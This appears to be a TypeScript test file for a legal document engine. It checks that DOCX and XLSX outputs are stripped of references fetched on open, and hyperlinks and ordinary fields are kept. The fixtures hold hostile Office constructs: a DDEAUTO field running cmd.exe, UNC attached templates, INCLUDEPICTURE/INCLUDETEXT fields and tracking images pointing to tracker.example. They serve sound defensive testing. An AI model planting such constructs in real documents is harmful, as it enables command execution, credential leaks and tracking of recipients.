/**
 * Office 打开零外部请求（v9 第 04 篇 §1.2 第 3 条、§11 P5 的 Office 部分）：
 * 原件里会在打开时外取的引用（UNC 附加模板、链接图片、OLE 链接、INCLUDEPICTURE/INCLUDETEXT 域、打开时更新域、邮件合并数据源、
 * VML 外部地址、XLSX 外部工作簿与数据连接）不随本产品写出的成果带出；超链接与普通域（PAGE、MERGEFIELD）保留。
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { readdirSync, readFileSync, statSync } from "node:fs";
import { join, relative } from "node:path";
import { fileURLToPath } from "node:url";
import { sha256Hex } from "@zr-legal/domain";
import { applyRevisionsToDocx, createDocx, extractParagraphs, findExternalRefs, readZipEntries, sanitizeDocx, writeRawZip, writeZip, type RevisionOp } from "../src/index.ts";

const R_NS = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
const REL = (type: string) => `${R_NS}/${type}`;

/** 构造含各类外取引用的“原件”（只用 writeRawZip，模拟律所收到的外部文件）。 */
function hostileDocx(): Buffer {
  const files = readZipEntries(createDocx("股权转让协议", [{ heading: "第一条", paragraphs: ["1.1 甲方应当按期付款。"] }]));
  const ct = files.get("[Content_Types].xml")!.toString("utf8").replace(
    "</Types>",
    `<Override PartName="/word/settings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/></Types>`,
  );
  files.set("[Content_Types].xml", Buffer.from(ct, "utf8"));
  const rels = files.get("_rels/.rels")!.toString("utf8").replace(
    "</Relationships>",
    `<Relationship Id="rIdX" Type="${REL("attachedTemplate")}" Target="https://tracker.example/pkg.dotm" TargetMode="External"/></Relationships>`,
  );
  files.set("_rels/.rels", Buffer.from(rels, "utf8"));
  files.set(
    "word/_rels/document.xml.rels",
    Buffer.from(
      `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">` +
        `<Relationship Id="rIdS" Type="${REL("settings")}" Target="settings.xml"/>` +
        `<Relationship Id="rIdImg" Type="${REL("image")}" Target="http://tracker.example/pixel.png" TargetMode="External"/>` +
        `<Relationship Id="rIdOle" Type="${REL("oleObject")}" Target="file:///\\\\srv\\share\\data.xlsx" TargetMode="External"/>` +
        `<Relationship Id="rIdSub" Type="${REL("subDocument")}" Target="\\\\srv\\share\\sub.docx"/>` +
        `<Relationship Id="rIdLink" Type="${REL("hyperlink")}" Target="https://www.npc.gov.cn/law" TargetMode="External"/>` +
        `</Relationships>`,
      "utf8",
    ),
  );
  files.set(
    "word/settings.xml",
    Buffer.from(
      `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="${R_NS}">` +
        `<w:attachedTemplate r:id="rIdT"/><w:linkStyles/><w:updateFields w:val="true"/>` +
        `<w:mailMerge><w:mainDocumentType w:val="formLetters"/><w:dataSource r:id="rIdM"/></w:mailMerge>` +
        `</w:settings>`,
      "utf8",
    ),
  );
  files.set(
    "word/_rels/settings.xml.rels",
    Buffer.from(
      `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">` +
        `<Relationship Id="rIdT" Type="${REL("attachedTemplate")}" Target="file:///\\\\fileserver\\templates\\firm.dotm" TargetMode="External"/>` +
        `<Relationship Id="rIdM" Type="${REL("mailMergeSource")}" Target="file:///\\\\fileserver\\merge\\list.xlsx" TargetMode="External"/>` +
        `</Relationships>`,
      "utf8",
    ),
  );
  const run = (inner: string) => `<w:r>${inner}</w:r>`;
  const hostile =
    // 链接图片（DrawingML a:blip r:link）与 VML 外部地址
    `<w:p>${run(`<w:drawing><a:blip xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" r:link="rIdImg"/></w:drawing>`)}` +
    `${run(`<w:pict><v:shape xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office"><v:imagedata o:href="http://tracker.example/v.png" r:id="rIdImg"/></v:shape></w:pict>`)}</w:p>` +
    // OLE 链接对象、子文档、超链接（保留）
    `<w:p>${run(`<w:object><o:OLEObject xmlns:o="urn:schemas-microsoft-com:office:office" Type="Link" ProgID="Excel.Sheet.12" r:id="rIdOle" UpdateMode="Always"><o:LinkType>Picture</o:LinkType></o:OLEObject></w:object>`)}</w:p>` +
    `<w:p><w:subDoc r:id="rIdSub"/></w:p>` +
    `<w:p><w:hyperlink r:id="rIdLink">${run(`<w:t>全国人大法律库</w:t>`)}</w:hyperlink></w:p>` +
    // 简单域 INCLUDEPICTURE（解包为结果文本）
    `<w:p><w:fldSimple w:instr=" INCLUDEPICTURE &quot;http://tracker.example/f.png&quot; \\d ">${run(`<w:t>图一</w:t>`)}</w:fldSimple></w:p>` +
    // 复杂域：域名拆在两个 instrText 里（INCLUDE + TEXT）
    `<w:p>${run(`<w:fldChar w:fldCharType="begin"/>`)}${run(`<w:instrText xml:space="preserve"> INCLUDE</w:instrText>`)}${run(`<w:instrText>TEXT "\\\\srv\\share\\clause.docx" </w:instrText>`)}` +
    `${run(`<w:fldChar w:fldCharType="separate"/>`)}${run(`<w:t>引入条款</w:t>`)}${run(`<w:fldChar w:fldCharType="end"/>`)}</w:p>` +
    // 嵌套：INCLUDEPICTURE "{ MERGEFIELD url }"——外层清空，内层 MERGEFIELD 保留
    `<w:p>${run(`<w:fldChar w:fldCharType="begin"/>`)}${run(`<w:instrText xml:space="preserve"> INCLUDEPICTURE "</w:instrText>`)}` +
    `${run(`<w:fldChar w:fldCharType="begin"/>`)}${run(`<w:instrText xml:space="preserve"> MERGEFIELD url </w:instrText>`)}${run(`<w:fldChar w:fldCharType="separate"/>`)}${run(`<w:t>u</w:t>`)}${run(`<w:fldChar w:fldCharType="end"/>`)}` +
    `${run(`<w:instrText xml:space="preserve">" \\d </w:instrText>`)}${run(`<w:fldChar w:fldCharType="separate"/>`)}${run(`<w:t>图二</w:t>`)}${run(`<w:fldChar w:fldCharType="end"/>`)}</w:p>` +
    // 普通域 PAGE（保留）；DDEAUTO（清空）
    `<w:p>${run(`<w:fldChar w:fldCharType="begin"/>`)}${run(`<w:instrText xml:space="preserve"> PAGE </w:instrText>`)}${run(`<w:fldChar w:fldCharType="separate"/>`)}${run(`<w:t>1</w:t>`)}${run(`<w:fldChar w:fldCharType="end"/>`)}</w:p>` +
    `<w:p>${run(`<w:fldChar w:fldCharType="begin"/>`)}${run(`<w:instrText xml:space="preserve"> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/c calc" </w:instrText>`)}${run(`<w:fldChar w:fldCharType="end"/>`)}</w:p>`;
  const doc = files
    .get("word/document.xml")!
    .toString("utf8")
    .replace(`<w:document xmlns:w=`, `<w:document xmlns:r="${R_NS}" xmlns:w=`)
    .replace("<w:sectPr/>", `${hostile}<w:sectPr/>`);
  files.set("word/document.xml", Buffer.from(doc, "utf8"));
  return writeRawZip([...files.entries()].map(([name, data]) => ({ name, data })));
}

function allText(buf: Buffer): string {
  return [...readZipEntries(buf).entries()].map(([n, d]) => `${n}\n${d.toString("utf8")}`).join("\n");
}

function op(originalText: string, newText: string): RevisionOp {
  return { opId: "op-1", anchor: { originalText }, originalHash: sha256Hex(originalText), newText, author: "Kimi Work 法律发行版（AI 建议）" };
}

test("P5 Office：原件中的外取引用全部被识别（对照样本）", () => {
  const found = findExternalRefs(readZipEntries(hostileDocx()));
  const kinds = new Set(found.map((f) => f.kind));
  for (const k of [
    "relationship:attachedTemplate",
    "relationship:image",
    "relationship:oleObject",
    "relationship:subDocument",
    "relationship:mailMergeSource",
    "vml_href",
    "field",
    "settings:updateFields",
    "settings:linkStyles",
    "settings:attachedTemplate",
    "settings:mailMerge",
  ]) {
    assert.ok(kinds.has(k), `应识别 ${k}；实际 ${[...kinds].join(",")}`);
  }
  assert.ok(!found.some((f) => f.kind === "relationship:hyperlink"), "超链接不算外取（点击才访问）");
  assert.equal(found.filter((f) => f.kind === "field").length, 4, "INCLUDEPICTURE（简单域）、INCLUDETEXT（拆分）、外层 INCLUDEPICTURE（嵌套）、DDEAUTO");
});

test("P5 Office：由原件派生的修订稿与受众净化件零外取引用；超链接、PAGE、MERGEFIELD 与正文保留", () => {
  const base = hostileDocx();
  const r = applyRevisionsToDocx(base, { baselineHash: sha256Hex(base), ops: [op("甲方应当按期付款", "甲方应当于每月 5 日前付款")] });
  for (const out of [r.docx, sanitizeDocx(r.docx).docx]) {
    const entries = readZipEntries(out);
    assert.deepEqual(findExternalRefs(entries), [], "写出的成果不得含任何外取引用");
    const text = allText(out);
    for (const bad of ["tracker.example", "\\\\srv", "fileserver", "INCLUDEPICTURE", "INCLUDETEXT", "DDEAUTO", "updateFields", "attachedTemplate", "mailMerge", "o:href"]) {
      assert.ok(!text.includes(bad), `成果中不应残留 ${bad}`);
    }
    assert.match(text, /https:\/\/www\.npc\.gov\.cn\/law/, "超链接保留");
    assert.match(text, / PAGE /, "普通域保留");
    assert.match(text, / MERGEFIELD url /, "嵌套的内层普通域保留");
    const paras = extractParagraphs(out).map((p) => p.text).join("\n");
    for (const kept of ["图一", "引入条款", "图二", "全国人大法律库"]) assert.ok(paras.includes(kept), `域结果与正文保留：${kept}`);
  }
  // 原件不变（成果在副本上生成）
  assert.ok(findExternalRefs(readZipEntries(base)).length > 0);
});

/** 复核 S5-B13：框架、altChunk、src 属性、单独的 LINK/DDE/IMPORT/INCLUDE 域、嵌套简单域、大写的关系部件名、非 w: 前缀、单引号属性。 */
function variantDocx(): Buffer {
  const files = readZipEntries(createDocx("租赁合同", [{ heading: "第一条", paragraphs: ["1.1 租金按月支付。"] }]));
  const W = "http://schemas.openxmlformats.org/wordprocessingml/2006/main";
  const run = (inner: string) => `<w:r>${inner}</w:r>`;
  const complex = (code: string, result: string) =>
    `<w:p>${run(`<w:fldChar w:fldCharType="begin"/>`)}${run(`<w:instrText xml:space="preserve">${code}</w:instrText>`)}${run(`<w:fldChar w:fldCharType="separate"/>`)}${run(`<w:t>${result}</w:t>`)}${run(`<w:fldChar w:fldCharType="end"/>`)}</w:p>`;
  files.set(
    "word/_rels/document.xml.rels",
    Buffer.from(
      `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">` +
        `<Relationship Id="rIdWS" Type="${REL("webSettings")}" Target="webSettings.xml"/>` +
        `<Relationship Id="rIdAC" Type="${REL("aFChunk")}" Target="https://tracker.example/chunk.html" TargetMode="External"/>` +
        `</Relationships>`,
    ),
  );
  files.set(
    "word/webSettings.xml",
    Buffer.from(`<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:webSettings xmlns:w="${W}" xmlns:r="${R_NS}"><w:frameset><w:frame><w:name w:val="f1"/><w:sourceFileName r:id='rIdFR'/></w:frame></w:frameset></w:webSettings>`),
  );
  files.set(
    "word/_rels/webSettings.xml.rels",
    Buffer.from(`<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rIdFR" Type="${REL("frame")}" Target="file:///\\\\fileserver\\frames\\f.docx" TargetMode="External"/></Relationships>`),
  );
  // 页眉：非 w: 前缀绑定同一命名空间；关系部件名大写
  files.set(
    "word/header1.xml",
    Buffer.from(
      `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><ns0:hdr xmlns:ns0="${W}" xmlns:r="${R_NS}" xmlns:v="urn:schemas-microsoft-com:vml">` +
        `<ns0:p><ns0:fldSimple ns0:instr=" INCLUDETEXT &quot;\\\\srv\\share\\h.docx&quot; "><ns0:r><ns0:t>页眉引入</ns0:t></ns0:r></ns0:fldSimple></ns0:p>` +
        `<ns0:p><ns0:r><ns0:pict><v:shape><v:imagedata r:id="rIdH" src="http://tracker.example/h.png"/></v:shape></ns0:pict></ns0:r></ns0:p>` +
        `</ns0:hdr>`,
    ),
  );
  files.set(
    "word/_RELS/header1.xml.rels",
    Buffer.from(`<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rIdH" Type="${REL("image")}" Target="http://tracker.example/hdr.png" TargetMode="External"/></Relationships>`),
  );
  const body =
    `<w:p><w:altChunk r:id="rIdAC"/></w:p>` +
    complex(` LINK Excel.Sheet.12 "\\\\srv\\share\\data.xlsx" "Sheet1!R1C1" \\a `, "链接结果") +
    complex(` DDE Excel "\\\\srv\\share\\d.xlsx" "R1C1" `, "交换结果") +
    complex(` IMPORT "http://tracker.example/i.wmf" `, "导入结果") +
    complex(` INCLUDE "\\\\srv\\share\\old.doc" `, "包含结果") +
    // 嵌套简单域：外层普通、内层外取；外层外取、内层普通
    `<w:p><w:fldSimple w:instr=" QUOTE &quot;外层&quot; "><w:fldSimple w:instr=" INCLUDEPICTURE &quot;http://tracker.example/n1.png&quot; "><w:r><w:t>内层图</w:t></w:r></w:fldSimple></w:fldSimple></w:p>` +
    `<w:p><w:fldSimple w:instr=" INCLUDEPICTURE &quot;http://tracker.example/n2.png&quot; "><w:fldSimple w:instr=" PAGE "><w:r><w:t>页码</w:t></w:r></w:fldSimple></w:fldSimple></w:p>`;
  const doc = files
    .get("word/document.xml")!
    .toString("utf8")
    .replace(`<w:document xmlns:w=`, `<w:document xmlns:r="${R_NS}" xmlns:w=`)
    .replace("<w:sectPr/>", `${body}<w:sectPr/>`);
  files.set("word/document.xml", Buffer.from(doc, "utf8"));
  return writeRawZip([...files.entries()].map(([name, data]) => ({ name, data })));
}

test("P5 Office（复核 S5-B13）：框架、altChunk、src、LINK/DDE/IMPORT/INCLUDE、嵌套简单域、大写关系部件名、其他前缀、单引号属性——识别并去除", () => {
  const base = variantDocx();
  const before = findExternalRefs(readZipEntries(base));
  const kinds = new Set(before.map((f) => f.kind));
  for (const k of ["relationship:frame", "relationship:aFChunk", "relationship:image", "vml_href", "field"]) assert.ok(kinds.has(k), `应识别 ${k}；实际 ${[...kinds].join(",")}`);
  const fieldCodes = before.filter((f) => f.kind === "field").map((f) => f.target ?? "");
  for (const name of ["LINK", "DDE", "IMPORT", "INCLUDE", "INCLUDETEXT"]) assert.ok(fieldCodes.some((c) => c.startsWith(name)), `应识别 ${name} 域：${fieldCodes.join(" | ")}`);
  assert.equal(fieldCodes.filter((c) => c.startsWith("INCLUDEPICTURE")).length, 2, "两处嵌套简单域里的 INCLUDEPICTURE 都应识别");
  const out = sanitizeDocx(base).docx;
  const entries = readZipEntries(out);
  assert.deepEqual(findExternalRefs(entries), [], "写出后零外取引用");
  const text = allText(out);
  for (const bad of ["tracker.example", "fileserver", "\\\\srv", "INCLUDEPICTURE", "INCLUDETEXT", " LINK ", " DDE ", " IMPORT ", " INCLUDE ", "rIdFR", "rIdAC", "rIdH\""]) {
    assert.ok(!text.includes(bad), `不应残留 ${bad}`);
  }
  assert.match(text, / QUOTE /, "普通的外层域保留");
  assert.match(text, / PAGE /, "被外取域包住的普通内层域保留");
  const paras = extractParagraphs(out).map((p) => p.text).join("\n");
  for (const kept of ["链接结果", "交换结果", "导入结果", "包含结果", "内层图", "页码"]) assert.ok(paras.includes(kept), `域结果保留：${kept}`);
});

test("P5 Office：XLSX 的外部工作簿链接与数据连接在写出时去除，内容类型与关系一致", () => {
  const wbRels =
    `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">` +
    `<Relationship Id="rId1" Type="${REL("worksheet")}" Target="worksheets/sheet1.xml"/>` +
    `<Relationship Id="rId2" Type="${REL("externalLink")}" Target="externalLinks/externalLink1.xml"/>` +
    `<Relationship Id="rId3" Type="${REL("connections")}" Target="connections.xml"/>` +
    `</Relationships>`;
  const entries = [
    {
      name: "[Content_Types].xml",
      data: Buffer.from(
        `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/>` +
          `<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>` +
          `<Override PartName="/xl/externalLinks/externalLink1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml"/>` +
          `<Override PartName="/xl/connections.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.connections+xml"/></Types>`,
      ),
    },
    { name: "_rels/.rels", data: Buffer.from(`<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="${REL("officeDocument")}" Target="xl/workbook.xml"/></Relationships>`) },
    {
      name: "xl/workbook.xml",
      data: Buffer.from(
        `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="${R_NS}"><sheets><sheet name="S" sheetId="1" r:id="rId1"/></sheets><externalReferences><externalReference r:id="rId2"/></externalReferences></workbook>`,
      ),
    },
    { name: "xl/_rels/workbook.xml.rels", data: Buffer.from(wbRels) },
    { name: "xl/worksheets/sheet1.xml", data: Buffer.from(`<?xml version="1.0" encoding="UTF-8" standalone="yes"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData/></worksheet>`) },
    { name: "xl/externalLinks/externalLink1.xml", data: Buffer.from(`<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="${R_NS}"><externalBook r:id="rId1"/></externalLink>`) },
    {
      name: "xl/externalLinks/_rels/externalLink1.xml.rels",
      data: Buffer.from(`<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="${REL("externalLinkPath")}" Target="file:///\\\\fileserver\\fin\\ledger.xlsx" TargetMode="External"/></Relationships>`),
    },
    { name: "xl/connections.xml", data: Buffer.from(`<connections xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><connection id="1" name="q" refreshOnLoad="1"><webPr url="http://tracker.example/q"/></connection></connections>`) },
  ];
  assert.ok(findExternalRefs(new Map(entries.map((e) => [e.name, e.data]))).length >= 3);
  const out = writeZip(entries);
  const files = readZipEntries(out);
  assert.deepEqual(findExternalRefs(files), []);
  assert.ok(!files.has("xl/connections.xml") && !files.has("xl/externalLinks/externalLink1.xml"));
  const text = allText(out);
  for (const bad of ["tracker.example", "fileserver", "externalReference", "connections.xml", "externalLink1"]) assert.ok(!text.includes(bad), `不应残留 ${bad}`);
  assert.match(files.get("xl/workbook.xml")!.toString("utf8"), /<sheet name="S"/, "工作表保留");
});

test("P5 Office：产品源码只经 writeZip 写出 OOXML（writeRawZip 仅限 zip.ts 内部与测试）", () => {
  const root = join(fileURLToPath(new URL(".", import.meta.url)), "..", "..", "..");
  const hits: string[] = [];
  const walk = (dir: string) => {
    for (const name of readdirSync(dir)) {
      if (name === "node_modules" || name === "test" || name === "dist" || name.startsWith(".")) continue;
      const p = join(dir, name);
      const st = statSync(p);
      if (st.isDirectory()) walk(p);
      else if (/\.(ts|tsx|mjs|cjs|js)$/.test(name) && !/\.bundle\./.test(name) && readFileSync(p, "utf8").includes("writeRawZip")) hits.push(relative(root, p));
    }
  };
  for (const top of ["packages", "services", "apps"]) walk(join(root, top));
  assert.deepEqual(hits.sort(), ["packages/docx-engine/src/zip.ts"], `writeRawZip 出现在：${hits.join(", ")}`);
});
